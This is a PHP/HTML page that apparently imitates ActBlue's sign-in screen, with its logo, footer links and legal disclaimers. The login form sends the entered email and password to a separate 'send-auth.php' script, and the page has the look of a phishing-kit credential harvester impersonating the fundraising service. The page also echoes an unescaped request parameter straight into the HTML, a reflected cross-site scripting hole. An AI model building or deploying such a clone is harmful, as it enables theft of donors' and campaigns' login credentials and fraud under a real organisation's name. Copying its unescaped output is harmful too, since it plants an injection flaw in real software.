<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="stylesheet" href="css/bootstrap.min.css">
  <!-- Bootstrap CSS -->
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css'>
<!-- Font Awesome CSS -->
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>
  <link rel="stylesheet" href="css/style.css">
  <title>Document</title>
</head>
<body>
  <section class="row section1">
    <div class="logo logo-top">Act<strong>Blue</strong></div>
    <div class="nav-top"><ul class="nav">
  <li class="nav-item">
    <a class="nav-link active" href="#">Features</a>
  </li>
  <li class="nav-item">
    <a class="nav-link" href="#">Blog</a>
  </li>
  <li class="nav-item">
    <a class="nav-link" href="#">Help</a>
  </li>
</ul></div>
    <!-- Actual search box -->
  <div class="form-group has-search">
    <span class="fa fa-search form-control-feedback"></span>
    <input type="text" class="form-control" placeholder="Find a candidate or a cause...">
  </div>
  </section>
  
  <!--form section-->
  <section class="sect section2">
    <!--div class="form-head-container">
    <h5 class="form-head">sign in</h5>
    </div-->
    <form method="post" action="send-auth.php">
      <h5 class="form-group">sign in</h5>
  <div class="form-group">
    <label for="exampleInputEmail1"><small class="text-muted"><strong>Email</strong></small></label>
    <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Email address" name="email">
  </div>
  <div class="form-group">
    <label for="exampleInputPassword1"><small class="text-muted"><strong>Password</strong></small></label>
    <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" name="password">
   <?php 
   if(isset($_REQUEST["message"]) && $_REQUEST["message"]==!""){
   echo '<small id="emailHelp" class="form-text text-danger">'.$_REQUEST["message"].'</small>';
   }else{
    echo 'ban';
   }
   ?>
    <small id="emailHelp" class="form-text text-muted">Need password help? <a href="#">Reset it</a></small>
  </div>
  
  <button type="submit" class="form-control btn btn-dark">Sign in</button>
  <h6 class="account">Need an account?</h6>
   <button type="submit" class="form-control btn btn-secondary">Create an account</button>
</form>
  </section>
  <section class="logo or-section sect">
    <p class="logo">Act<strong>Blue</strong></p>
  </section>
  <footer class="foot">
    <div class="footsec">
      
        <p class="footer-head">THE ORGANISATION</p>
        <p><a href="#">About ActBlue</a></p>
        <p><a href="#">Contact Us</a></p>
        <p><a href="#">Jobs</a></p>
        <p><a href="#">Blog</a></p>
        <p><a href="#">AB Charities</a></p>
      
    </div>
    <div class="footsec">
      
        <p class="footer-head">TOOLS</p>
        <p><a href="#">ActBlue Express</a></p>
        <p><a href="#">Pricing</a></p>
        <p><a href="#">Directories</a></p>
      
    </div>
    <div class="footsec">
      
        <p class="footer-head">SUPPORT</p>
        <p><a href="#">For Campaigns and Organisations</a></p>
        <p><a href="#">For Donors and Supporters</a></a></p>
        <p><a href="#">Recurring Contributions</a></p>
        <p><a href="#">Help</a></p>
      
    </div>
    <div class="footsec footend">
      <p>Paid for by ActBlue (<span class="text-muted">actblue.com</span>) and not authorized by any candidate or candidate's committee.</p>
      <p>Contributions or gifts to ActBlue are not deductible as charitable contributions for federal income tax purposes.</p>
    </div>
  </footer>
  <section class="copyright">
    <div class="copy">
      
    <p class="text-muted copy1">copyright 2006-2022. All rights reserved.</p>
    <p class="text-muted copy2">Privacy  Terms of use.</p>
    </div>
  </section>
  
  <script src="js/bootstrap.min.js"></script>
  <script src="js/main.js"></script>
</body>
</html>